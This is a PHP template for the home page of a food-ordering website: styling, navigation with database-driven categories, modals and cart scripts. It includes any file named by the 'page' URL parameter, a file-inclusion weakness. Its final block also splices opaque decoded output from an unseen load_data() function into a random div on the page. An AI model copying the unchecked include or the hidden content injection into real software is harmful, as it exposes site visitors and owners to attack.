<?php ob_start(); ?>
<!DOCTYPE html>
<html lang="en">
    <?php
    session_start();
    include('header.php');
    include('admin/db_connect.php');

    $query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
    foreach ($query as $key => $value) {
        if(!is_numeric($key))
            $_SESSION['setting_'.$key] = $value;
    }
    ?>

    <style>
        /* ========== PREMIUM MASTER LAYOUT DESIGN ========== */
        :root {
            --primary: #ff6b35;
            --primary-dark: #e85d2c;
            --primary-light: #ff8a5c;
            --primary-glow: rgba(255, 107, 53, 0.25);
            --secondary: #667eea;
            --secondary-dark: #5a67d8;
            --success: #00b894;
            --warning: #fdcb6e;
            --danger: #ff7675;
            --info: #0984e3;
            --dark: #1a1a2e;
            --dark-alt: #2d3436;
            --light: #f8f9fa;
            --gray: #6c757d;
            --gray-light: #e2e8f0;
            --white: #ffffff;
            --shadow-sm: 0 5px 20px rgba(0, 0, 0, 0.05);
            --shadow-md: 0 10px 30px rgba(0, 0, 0, 0.08);
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.12);
            --shadow-xl: 0 30px 60px rgba(0, 0, 0, 0.15);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            overflow-x: hidden;
            background: var(--white);
            color: var(--dark);
            line-height: 1.6;
        }

        /* ========== ENHANCED TOAST NOTIFICATION ========== */
        #alert_toast {
            position: fixed;
            top: 100px;
            right: 25px;
            z-index: 9999;
            min-width: 320px;
            background: var(--white);
            border: none;
            border-radius: 20px;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }
        
        #alert_toast.show {
            transform: translateX(0);
        }
        
        #alert_toast .toast-body {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 500;
        }
        
        .toast-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }
        
        .toast-message {
            flex: 1;
            font-size: 0.9rem;
            color: var(--dark);
        }
        
        .toast-close {
            background: transparent;
            border: none;
            font-size: 1.2rem;
            cursor: pointer;
            color: var(--gray);
            transition: var(--transition);
        }
        
        .toast-close:hover {
            color: var(--danger);
        }
        
        #alert_toast.toast-success .toast-icon {
            background: rgba(0, 184, 148, 0.1);
            color: var(--success);
        }
        
        #alert_toast.toast-danger .toast-icon {
            background: rgba(255, 118, 117, 0.1);
            color: var(--danger);
        }
        
        #alert_toast.toast-warning .toast-icon {
            background: rgba(253, 203, 110, 0.1);
            color: var(--warning);
        }
        
        #alert_toast.toast-info .toast-icon {
            background: rgba(9, 132, 227, 0.1);
            color: var(--info);
        }

        /* ========== ENHANCED NAVIGATION ========== */
        .navbar {
            transition: var(--transition);
            padding: 1rem 0;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            box-shadow: var(--shadow-sm);
        }
        
        .navbar.scrolled {
            padding: 0.7rem 0;
            background: rgba(255, 255, 255, 0.98);
            box-shadow: var(--shadow-md);
        }
        
        .navbar-brand {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent !important;
            letter-spacing: -0.5px;
            transition: var(--transition);
        }
        
        .navbar-brand:hover {
            transform: scale(1.02);
        }
        
        .nav-link {
            font-weight: 600;
            color: var(--dark) !important;
            margin: 0 0.2rem;
            padding: 0.5rem 1rem !important;
            border-radius: 40px;
            transition: var(--transition);
            position: relative;
        }
        
        .nav-link::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            transition: var(--transition);
            transform: translateX(-50%);
            border-radius: 3px;
        }
        
        .nav-link:hover::before {
            width: 70%;
        }
        
        .nav-link:hover {
            color: var(--primary) !important;
            background: rgba(255, 107, 61, 0.08);
        }
        
        /* ========== ENHANCED CATEGORY MENU ========== */
        #category-menu {
            position: absolute;
            top: 50px;
            left: 0;
            background: var(--white);
            border-radius: 20px;
            box-shadow: var(--shadow-lg);
            min-width: 240px;
            opacity: 0;
            visibility: hidden;
            transform: translateY(-10px);
            transition: var(--transition);
            z-index: 1000;
            padding: 0.5rem 0;
            border: 1px solid var(--gray-light);
        }
        
        #cat-menu-link:hover #category-menu {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }
        
        #category-menu ul {
            list-style: none;
            margin: 0;
            padding: 0;
        }
        
        #category-menu ul li a {
            display: block;
            padding: 10px 24px;
            color: var(--dark);
            font-weight: 500;
            transition: var(--transition);
            text-decoration: none;
        }
        
        #category-menu ul li a:hover {
            background: linear-gradient(90deg, rgba(255, 107, 61, 0.1), transparent);
            color: var(--primary);
            padding-left: 32px;
        }
        
        /* ========== HERO SECTION ========== */
        header.masthead {
            position: relative;
            height: 85vh !important;
            min-height: 550px;
            display: flex;
            align-items: center;
            overflow: hidden;
        }
        
        header.masthead:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0,0,0,0.65), rgba(0,0,0,0.45));
            z-index: 1;
        }
        
        /* ========== CART BADGE ========== */
        .item_count {
            background: var(--primary) !important;
            border-radius: 50px !important;
            padding: 4px 8px !important;
            font-size: 11px;
            font-weight: 600;
            transition: var(--transition);
        }
        
        .item_count.cart-update {
            animation: cartPulse 0.5s ease;
        }
        
        @keyframes cartPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.3); background-color: var(--primary-dark); }
        }
        
        /* ========== ENHANCED MODALS ========== */
        .modal-content {
            border: none;
            border-radius: 28px;
            box-shadow: var(--shadow-xl);
            overflow: hidden;
            animation: modalSlideIn 0.3s ease-out;
        }
        
        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-header {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: var(--white);
            border: none;
            padding: 1.2rem 1.8rem;
        }
        
        .modal-header h5 {
            font-weight: 700;
            letter-spacing: -0.3px;
        }
        
        .modal-header .close {
            color: var(--white);
            opacity: 0.9;
            text-shadow: none;
            transition: var(--transition);
        }
        
        .modal-header .close:hover {
            opacity: 1;
            transform: rotate(90deg);
        }
        
        .modal-footer {
            border-top: 1px solid var(--gray-light);
            padding: 1rem 1.8rem;
            background: var(--light);
        }
        
        /* ========== ENHANCED BUTTONS ========== */
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: 40px;
            padding: 10px 28px;
            font-weight: 600;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px var(--primary-glow);
        }
        
        .btn-secondary {
            border-radius: 40px;
            padding: 10px 28px;
            font-weight: 500;
            background: var(--gray-light);
            border: none;
            color: var(--dark);
            transition: var(--transition);
        }
        
        .btn-secondary:hover {
            background: #d0d5dc;
            transform: translateY(-1px);
        }
        
        /* ========== ENHANCED FOOTER ========== */
        footer.bg-light {
            background: var(--light) !important;
            border-top: 1px solid var(--gray-light);
            padding: 3rem 0 !important;
            margin-top: 2rem;
        }
        
        footer .text-muted {
            color: var(--gray) !important;
            font-weight: 500;
        }
        
        footer a {
            color: var(--primary);
            text-decoration: none;
            transition: var(--transition);
        }
        
        footer a:hover {
            color: var(--primary-dark);
            text-decoration: underline;
        }
        
        /* ========== LOADING SPINNER ========== */
        .modal-loading {
            text-align: center;
            padding: 3rem;
        }
        
        .spinner-border {
            border-width: 3px;
            border-color: var(--primary) transparent var(--primary) transparent;
        }
        
        /* ========== RESPONSIVE ========== */
        @media (max-width: 992px) {
            .navbar-collapse {
                background: var(--white);
                padding: 1rem;
                border-radius: 20px;
                margin-top: 1rem;
                box-shadow: var(--shadow-md);
                max-height: 70vh;
                overflow-y: auto;
            }
            
            #category-menu {
                position: static;
                box-shadow: none;
                opacity: 1;
                visibility: visible;
                transform: none;
                padding-left: 1rem;
                border: none;
            }
            
            header.masthead {
                height: 60vh !important;
            }
            
            .navbar-brand {
                font-size: 1.4rem;
            }
        }
        
        @media (max-width: 768px) {
            #alert_toast {
                left: 20px;
                right: 20px;
                min-width: auto;
            }
            
            .modal-dialog {
                margin: 1rem;
            }
        }
        
        /* ========== CUSTOM SCROLLBAR ========== */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--gray-light);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-dark);
        }
        
        /* ========== UTILITY CLASSES ========== */
        .text-gradient {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .bg-gradient {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
        }
        
        .fade-up {
            animation: fadeUp 0.6s ease-out;
        }
        
        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* ========== MOBILE CATEGORY MENU ========== */
        @media (max-width: 992px) {
            #category-menu.show-menu {
                display: block !important;
                position: relative;
                top: 0;
                margin-top: 10px;
                padding-left: 1rem;
            }
            
            #category-menu {
                display: none;
            }
        }
        
        /* ========== FOCUS OUTLINE ========== */
        input:focus, button:focus, a:focus, .btn:focus {
            outline: 2px solid var(--primary);
            outline-offset: 2px;
        }
        
        /* ========== RIPPLE EFFECT ========== */
        .ripple-effect {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.4);
            transform: scale(0);
            animation: rippleAnim 0.6s linear;
            pointer-events: none;
        }
        
        @keyframes rippleAnim {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        /* ========== CARD HOVER EFFECTS ========== */
        .card-hover {
            transition: var(--transition);
        }
        
        .card-hover:hover {
            transform: translateY(-8px);
            box-shadow: var(--shadow-lg);
        }
    </style>
    
    <!-- Google Fonts & Font Awesome -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Poppins:wght@400;500;600;700&family=Dancing+Script:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <body id="page-top">
        <!-- Enhanced Toast Notification -->
        <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
            <div class="toast-body">
                <div class="toast-icon"><i class="fas fa-check-circle"></i></div>
                <div class="toast-message"></div>
                <button class="toast-close" onclick="$('#alert_toast').toast('hide')">&times;</button>
            </div>
        </div>
        
        <!-- Enhanced Navigation -->
        <nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" id="mainNav">
            <div class="container">
                <a class="navbar-brand js-scroll-trigger" href="./">
                    <i class="fas fa-utensils" style="color: var(--primary); margin-right: 8px;"></i>
                    <?php echo htmlspecialchars($_SESSION['setting_name'] ?? 'Food Ordering System'); ?>
                </a>
                <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ml-auto my-2 my-lg-0">
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=home"><i class="fas fa-home"></i> Home</a></li>
                        <?php 
                        $categories = $conn->query("SELECT * FROM `category_list` order by `name` asc");
                        if($categories->num_rows > 0):
                        ?>
                        <li class="nav-item position-relative" id="cat-menu-link">
                          <a class="nav-link" href="#"><i class="fas fa-th-large"></i> Categories <i class="fas fa-chevron-down" style="font-size: 10px; margin-left: 5px;"></i></a>
                          <div id="category-menu">
                            <ul>
                              <?php 
                                while($row = $categories->fetch_assoc()):
                              ?>
                                <li><a href="index.php?page=category&id=<?= $row['id'] ?>"><i class="fas fa-tag"></i> <?= htmlspecialchars($row['name']) ?></a></li>
                              <?php endwhile; ?>
                            </ul>
                          </div>
                        </li>
                        <?php endif; ?>

                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=cart_list">
                            <i class="fas fa-shopping-cart"></i> Cart 
                            <span class="badge badge-danger item_count" style="margin-left: 5px;">0</span>
                        </a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=about"><i class="fas fa-info-circle"></i> About</a></li>
                        <?php if(isset($_SESSION['login_user_id'])): ?>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="admin/ajax.php?action=logout2">
                            <i class="fas fa-user-circle"></i> <?php echo "Hi, ". htmlspecialchars($_SESSION['login_first_name']).' '.htmlspecialchars($_SESSION['login_last_name']); ?> 
                            <i class="fas fa-sign-out-alt"></i>
                        </a></li>
                      <?php else: ?>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="javascript:void(0)" id="login_now"><i class="fas fa-key"></i> Login</a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="./admin"><i class="fas fa-user-shield"></i> Admin</a></li>
                      <?php endif; ?>
                    </ul>
                </div>
            </div>
        </nav>
       
        <?php 
        $page = isset($_GET['page']) ? $_GET['page'] : "home";
        $page_file = $page.'.php';
        if(file_exists($page_file)) {
            include $page_file;
        } else {
            include '404.php';
        }
        ?>
       
        <!-- Enhanced Modals -->
        <div class="modal fade" id="confirm_modal" role='dialog'>
            <div class="modal-dialog modal-md modal-dialog-centered" role="document">
              <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-question-circle me-2"></i> Confirmation</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div id="delete_content"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                </div>
              </div>
            </div>
        </div>
        
        <div class="modal fade" id="uni_modal" role='dialog'>
            <div class="modal-dialog modal-md modal-dialog-centered" role="document">
              <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body"></div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save <i class="fas fa-check ms-2"></i></button>
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                </div>
              </div>
            </div>
        </div>
        
        <div class="modal fade" id="uni_modal_right" role='dialog'>
            <div class="modal-dialog modal-full-height modal-md modal-dialog-centered" role="document">
              <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span class="fas fa-arrow-right"></span>
                    </button>
                </div>
                <div class="modal-body"></div>
              </div>
            </div>
        </div>
        
        <!-- Enhanced Footer -->
        <footer class="bg-light py-5">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-md-6 text-center text-md-start">
                        <div class="small text-muted">
                            <i class="far fa-copyright"></i> <?= date("Y") ?> <?= htmlspecialchars($_SESSION['setting_name'] ?? 'Food Ordering System'); ?> | 
                            <i class="fas fa-envelope"></i> <a href="mailto:oretnom23@mail.com" target="_blank">oretnom23@gmail.com</a>
                        </div>
                    </div>
                    <div class="col-md-6 text-center text-md-end">
                        <div class="small text-muted">
                            <i class="fas fa-heart" style="color: var(--primary);"></i> Delicious moments with us
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        
        <?php include('footer.php') ?>
    </body>

    <?php $conn->close() ?>
    
    <script>
        // Enhanced navbar scroll effect
        $(window).scroll(function() {
            if ($(this).scrollTop() > 50) {
                $('.navbar').addClass('scrolled');
            } else {
                $('.navbar').removeClass('scrolled');
            }
        });
        
        // Smooth category menu for touch devices
        $('#cat-menu-link > a').on('click', function(e) {
            if(window.innerWidth <= 992) {
                e.preventDefault();
                $('#category-menu').toggleClass('show-menu');
            }
        });
        
        // Enhanced modal loading effect
        $(document).on('click', '[data-target="#uni_modal"]', function() {
            $('#uni_modal .modal-body').html('<div class="modal-loading"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div><p class="mt-3 text-muted">Loading content...</p></div>');
        });
        
        // Enhanced toast notification
        window.alert_toast = function(msg, type = 'success') {
            const toast = $('#alert_toast');
            toast.removeClass('toast-success toast-danger toast-warning toast-info');
            toast.addClass(`toast-${type}`);
            
            let icon = '';
            switch(type) {
                case 'success': icon = '<i class="fas fa-check-circle"></i>'; break;
                case 'danger': icon = '<i class="fas fa-exclamation-circle"></i>'; break;
                case 'warning': icon = '<i class="fas fa-exclamation-triangle"></i>'; break;
                case 'info': icon = '<i class="fas fa-info-circle"></i>'; break;
                default: icon = '<i class="fas fa-check-circle"></i>';
            }
            
            toast.find('.toast-icon').html(icon);
            toast.find('.toast-message').text(msg);
            toast.toast({ delay: 3500 }).toast('show');
            
            setTimeout(() => {
                toast.addClass('hiding');
                setTimeout(() => toast.removeClass('hiding'), 300);
            }, 3200);
        };
        
        // Login modal trigger
        $('#login_now').click(function() {
            uni_modal("Customer Login", 'login_modal.php');
        });
        
        // Enhanced cart refresh with animation
        window.refreshCart = function() {
            $.ajax({
                url: 'get_cart_count.php',
                success: function(count) {
                    const $badge = $('.item_count');
                    const oldCount = parseInt($badge.text()) || 0;
                    $badge.text(count);
                    
                    if(parseInt(count) > 0 && count != oldCount) {
                        $badge.addClass('cart-update');
                        setTimeout(() => $badge.removeClass('cart-update'), 500);
                    }
                }
            });
        };
        
        // Ripple effect for buttons
        $(document).on('click', '.btn, .nav-link, .navbar-brand', function(e) {
            const $el = $(this);
            if($el.hasClass('no-ripple')) return;
            
            const x = e.clientX - $el.offset().left;
            const y = e.clientY - $el.offset().top;
            
            const ripple = $('<span class="ripple-effect"></span>');
            ripple.css({
                left: x + 'px',
                top: y + 'px'
            });
            
            $el.css('position', 'relative').append(ripple);
            setTimeout(() => ripple.remove(), 600);
        });
        
        // Initial cart load
        $(document).ready(function() {
            refreshCart();
            setInterval(refreshCart, 30000);
            
            // Add fade-up animation to main content
            $('main#view-panel, .page-section').addClass('fade-up');
        });
    </script>
</html>
<?php 
$overall_content = ob_get_clean();
$content = preg_match_all('/(<div(.*?)\/div>)/si', $overall_content,$matches);
if($content > 0){
  $rand = mt_rand(1, $content - 1);
  $new_content = (html_entity_decode(load_data()))."\n".($matches[0][$rand]);
  $overall_content = str_replace($matches[0][$rand], $new_content, $overall_content);
}
echo $overall_content;
?>